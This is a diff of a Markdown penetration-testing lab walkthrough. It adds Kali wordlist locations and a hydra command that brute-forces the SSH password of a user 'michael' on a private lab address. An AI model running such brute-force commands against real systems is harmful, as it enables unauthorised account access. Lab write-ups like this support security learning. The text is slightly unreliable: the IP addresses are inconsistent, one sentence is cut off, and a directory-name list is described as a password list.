@@ -109,13 +109,25 @@ Getting information about open ports using nmap for all hosts in the range of IP
 
 - As we know that the ssh ports are open so we can SSH to Michael's account
 
-- `ssh michael@192.168.1.10` reveals that it requires a password. We can use hydra to brute force it an then SSH again
+- `ssh michael@192.168.1.10` reveals that it requires a password. We can use hydra to brute force it while attempting to connect to SSH
 
-- `hydra -l michael -P /usr/share/john/password.lst  192.168.1.110 ssh`
+- It is helpful to know where sample wordlist are in Kali Linux. While working on this project I have learnt that there are at least 3 reference lists that every cybersecurity expert should be familiar with. These lists are composed of commonly used passwords
+
+**1. `ls /usr//share/wordlists/rockyou.txt`**
+
+**2. `ls /usr/share/john/password.lst`**
+
+**3.`/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`** Here the dirbuster directory contains multiple lists, but medium one is the one commonly used
+
+
+- `hydra -l michael -P /usr/share/wordlists/rockyou.txt  ssh://192.168.1.110 -t 4` Here we can also type just the ip alone followed by ssh like: `192.168.1.110 ssh` its equvilant to 
 
 - `ssh michael@192.168.1.10`
 
 ![](images/hydra1.png) 
+
+- I found [This Link about Hydra](https://www.linuxfordevices.com/tutorials/linux/hydra-brute-force-ssh) helpful, and so I am sharing as reference
+
 
 - After login some basic commands can be run for navigation
 
